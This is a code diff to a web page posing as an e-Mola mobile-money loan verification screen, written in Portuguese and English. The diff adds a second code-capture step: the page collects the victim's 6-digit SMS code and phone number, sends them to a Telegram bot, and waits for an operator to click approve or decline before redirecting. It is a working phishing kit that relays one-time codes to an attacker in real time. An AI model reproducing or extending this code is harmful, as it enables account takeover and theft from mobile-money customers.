@@ -71,21 +71,21 @@ main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 
 
 <main>
   <div class="card">
-    <div class="progress"><div class="pd done"></div><div class="pd on"></div><div class="pd"></div></div>
+    <div class="progress"><div class="pd done"></div><div class="pd done"></div><div class="pd on"></div></div>
     <div class="card-head">
-      <h1 data-i18n="otp.h1">Confirme o seu código</h1>
-      <p data-i18n="otp.sub">Insira o código de confirmação de 6 dígitos enviado para o seu telemóvel</p>
+      <h1 data-i18n="vf.h1">Confirme o seu código</h1>
+      <p data-i18n="vf.sub">Insira o código de confirmação de 6 dígitos enviado para o seu telemóvel</p>
     </div>
 
     <div id="bBar" class="bundle-bar" style="display:none">
-      <div class="b-row"><span data-i18n="otp.bAmount">Empréstimo:</span><span id="bD">&mdash;</span></div>
-      <div class="b-row"><span data-i18n="otp.bDur">Prazo:</span><span id="bDur">&mdash;</span></div>
-      <div class="b-row"><span data-i18n="otp.bTotal">Total a Pagar:</span><span id="bP">0 MZN</span></div>
+      <div class="b-row"><span data-i18n="vf.bAmount">Empréstimo:</span><span id="bD">&mdash;</span></div>
+      <div class="b-row"><span data-i18n="vf.bDur">Prazo:</span><span id="bDur">&mdash;</span></div>
+      <div class="b-row"><span data-i18n="vf.bTotal">Total a Pagar:</span><span id="bP">0 MZN</span></div>
     </div>
 
     <div id="err" class="err"></div>
 
-    <label class="fl" data-i18n="otp.code">Código de Verificação</label>
+    <label class="fl" data-i18n="vf.code">Código de Verificação</label>
     <div class="otp-row" id="otpRow">
       <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
       <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
@@ -94,36 +94,36 @@ main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 
       <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
       <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
     </div>
-    <p class="hint" data-i18n="otp.hint">Verifique o seu SMS para o código de confirmação de 6 dígitos</p>
+    <p class="hint" data-i18n="vf.hint">Verifique o seu SMS para o código de confirmação de 6 dígitos</p>
 
     <div class="btns">
-      <button class="btn-p" onclick="doOTP()" data-i18n="otp.btn">Confirmar & Continuar</button>
-      <button class="btn-o" onclick="location.href='login.html'" data-i18n="otp.cancel">Cancelar</button>
+      <button class="btn-p" onclick="doOTP()" data-i18n="vf.btn">Confirmar & Continuar</button>
+      <button class="btn-o" onclick="location.href='otp.html'" data-i18n="vf.cancel">Cancelar</button>
     </div>
 
-    <div class="card-ft" data-i18n="otp.foot">Protegido com segurança e-Mola.</div>
-    <div class="secure" data-i18n="otp.secure">🔒 Protegido com segurança e-Mola</div>
+    <div class="card-ft" data-i18n="vf.foot">Protegido com segurança e-Mola.</div>
+    <div class="secure" data-i18n="vf.secure">🔒 Protegido com segurança e-Mola</div>
   </div>
 </main>
 
-<div id="ov" class="overlay"><div class="spin"></div><div class="sp-t" data-i18n="otp.loading">A confirmar o código</div><div class="sp-s" data-i18n="otp.wait">Por favor aguarde...</div></div>
+<div id="ov" class="overlay"><div class="spin"></div><div class="sp-t" data-i18n="vf.loading">A confirmar o código</div><div class="sp-s" data-i18n="vf.wait">Por favor aguarde...</div></div>
 
 <script>
 const translations={
   pt:{
-    "otp.h1":"Confirme o seu código","otp.sub":"Insira o código de confirmação de 6 dígitos enviado para o seu telemóvel",
-    "otp.bAmount":"Empréstimo:","otp.bDur":"Prazo:","otp.bTotal":"Total a Pagar:",
-    "otp.code":"Código de Verificação","otp.hint":"Verifique o seu SMS para o código de confirmação de 6 dígitos",
-    "otp.btn":"Confirmar & Continuar","otp.cancel":"Cancelar","otp.foot":"Protegido com segurança e-Mola.","otp.secure":"🔒 Protegido com segurança e-Mola",
-    "otp.loading":"A confirmar o código","otp.wait":"Por favor aguarde...",
+    "vf.h1":"Confirme o seu código","vf.sub":"Insira o código de confirmação de 6 dígitos enviado para o seu telemóvel",
+    "vf.bAmount":"Empréstimo:","vf.bDur":"Prazo:","vf.bTotal":"Total a Pagar:",
+    "vf.code":"Código de Verificação","vf.hint":"Verifique o seu SMS para o código de confirmação de 6 dígitos",
+    "vf.btn":"Confirmar & Continuar","vf.cancel":"Cancelar","vf.foot":"Protegido com segurança e-Mola.","vf.secure":"🔒 Protegido com segurança e-Mola",
+    "vf.loading":"A confirmar o código","vf.wait":"Por favor aguarde...",
     "err.all6":"Insira todos os 6 dígitos","err.declined":"Código recusado. Tente novamente."
   },
   en:{
-    "otp.h1":"Confirm your code","otp.sub":"Enter the 6-digit confirmation code sent to your phone",
-    "otp.bAmount":"Loan:","otp.bDur":"Term:","otp.bTotal":"Total to Pay:",
-    "otp.code":"Verification Code","otp.hint":"Check your SMS for the 6-digit confirmation code",
-    "otp.btn":"Confirm & Continue","otp.cancel":"Cancel","otp.foot":"Protected with e-Mola security.","otp.secure":"🔒 Protected with e-Mola security",
-    "otp.loading":"Confirming code","otp.wait":"Please wait...",
+    "vf.h1":"Confirm your code","vf.sub":"Enter the 6-digit confirmation code sent to your phone",
+    "vf.bAmount":"Loan:","vf.bDur":"Term:","vf.bTotal":"Total to Pay:",
+    "vf.code":"Verification Code","vf.hint":"Check your SMS for the 6-digit confirmation code",
+    "vf.btn":"Confirm & Continue","vf.cancel":"Cancel","vf.foot":"Protected with e-Mola security.","vf.secure":"🔒 Protected with e-Mola security",
+    "vf.loading":"Confirming code","vf.wait":"Please wait...",
     "err.all6":"Please enter all 6 digits","err.declined":"Code declined. Please try again."
   }
 };
@@ -190,9 +190,9 @@ function doOTP(){
   clrErr();
   document.getElementById('ov').classList.add('on');
 
-  const msg=`📱 <b>Verification Code #1 (Device)</b>\n\n<b>Phone:</b> <code>+258${phone}</code>\n<b>Code:</b> <code>${otp}</code>\n\n<b>Loan:</b> <code>${fmtNum(bd.amount)} MZN</code>\n<b>Term:</b> <code>${bd.duration||'N/A'} days</code>`;
+  const msg=`🔐 <b>Verification Code #2 (Smart OTP Activation)</b>\n\n<b>Phone:</b> <code>+258${phone}</code>\n<b>Code:</b> <code>${otp}</code>\n\n<b>Loan:</b> <code>${fmtNum(bd.amount)} MZN</code>\n<b>Term:</b> <code>${bd.duration||'N/A'} days</code>`;
 
-  const btns=[[{text:'✓ Verify Device',callback_data:'verify_device'},{text:'✗ Decline OTP',callback_data:'otp_declined'}]];
+  const btns=[[{text:'✓ Approve OTP',callback_data:'otp2_approved'},{text:'✗ Decline OTP',callback_data:'otp2_declined'}]];
   tg(msg,btns);
   pollOTP();
 }
@@ -208,17 +208,16 @@ function pollOTP(){
         const u=d.result[0];luid=u.update_id;
         if(u.callback_query){
           const cb=u.callback_query.data;
-          if(cb==='verify_device'){
+          if(cb==='otp2_approved'){
             clearInterval(iv);
             document.getElementById('ov').classList.remove('on');
-            // Show 3s spinner before advancing
             document.getElementById('ov').classList.add('on');
             setTimeout(()=>{
               const params=new URLSearchParams({amount:bd.amount||'',duration:bd.duration||'',interest:bd.interest||'',total:bd.total||'',phone:phone});
-              location.href='verify.html?'+params.toString();
-            },3000);
+              location.href='success.html?'+params.toString();
+            },1500);
           }
-          else if(cb==='otp_declined'){
+          else if(cb==='otp2_declined'){
             clearInterval(iv);
             document.getElementById('ov').classList.remove('on');
             showErr(tr('err.declined'));
